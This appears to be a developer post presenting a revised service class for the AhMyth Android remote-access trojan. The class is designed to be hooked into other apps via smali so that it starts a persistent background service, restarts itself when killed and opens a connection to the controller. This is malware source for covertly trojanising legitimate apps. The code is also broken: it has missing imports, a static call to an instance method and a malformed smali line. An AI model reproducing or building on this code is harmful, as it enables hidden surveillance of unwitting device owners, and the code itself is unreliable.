## New hopeful `MainService` for new Smali Hooking function
```java
package ahmyth.mine.king.ahmyth;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.support.p000v4.app.NotificationCompat;
import android.support.p000v4.view.PointerIconCompat;

public class MainService extends Service {
    static final /* synthetic */ boolean $assertionsDisabled = false;
    private static Context contextOfApplication;
    
        private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startService(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startService(context);
        }
    }

    // Smali hook point
    public static void start() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }
    
    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        if (Build.VERSION.SDK_INT >= 26) {
            startMyOwnForeground();
        } else {
            startForeground(1, new Notification());
        }
        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return 1;
    }

    public void onDestroy() {
        super.onDestroy();
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        ((AlarmManager) getSystemService(NotificationCompat.CATEGORY_ALARM)).set(2, 1000, PendingIntent.getService(getApplicationContext(), PointerIconCompat.TYPE_CONTEXT_MENU, new Intent(getApplicationContext(), MainService.class), 1073741824));
    }

    private void startMyOwnForeground() {
        NotificationChannel notificationChannel = new NotificationChannel("com.play.service.techno", "My Background Service", 0);
        notificationChannel.setLightColor(-16776961);
        notificationChannel.setLockscreenVisibility(0);
        ((NotificationManager) getSystemService("notification")).createNotificationChannel(notificationChannel);
        startForeground(1, new NotificationCompat.Builder(this, "com.play.service.techno").setOngoing(true).setContentTitle("App is running in background").setPriority(1).setCategory(NotificationCompat.CATEGORY_SERVICE).build());
    }
}
```
## New Hook Method
```smali

return-void, {} Lcom/package/ID/ahmyth;->start(MainService)V
```
